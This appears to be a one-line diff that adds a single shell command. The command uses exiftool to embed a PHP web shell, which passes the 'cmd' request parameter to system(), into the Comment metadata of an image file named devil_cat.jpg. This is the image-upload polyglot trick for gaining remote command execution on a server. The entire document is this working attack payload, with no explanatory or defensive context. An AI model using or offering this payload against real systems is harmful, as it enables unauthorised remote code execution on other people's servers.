@@ -1,0 +1,1 @@
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); echo "</pre>" ?>' devil_cat.jpg
